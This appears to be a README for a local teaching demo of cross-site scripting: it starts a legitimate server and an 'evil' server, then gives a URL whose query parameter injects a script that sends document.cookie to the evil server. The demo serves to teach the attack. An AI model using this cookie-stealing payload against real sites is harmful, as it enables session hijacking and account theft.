# Cross-site scripting (XSS) attack demo

This quick implementation demonstrates Cross-site scripting (XSS) in action.

Start the real server:

```
cd realserver

npm i
node app.js
```

In a new terminal session, start the evil server 👹:

```
cd evilserver

npm i
node evil.js
```

In a web browser, send the malicious request:

```
http://localhost:3000?txid=TX999<script>new Image().src=`http://localhost:3666/evil?cookie=${document.cookie}`</script>
```

The cookie information will be sent to the malicious destination.
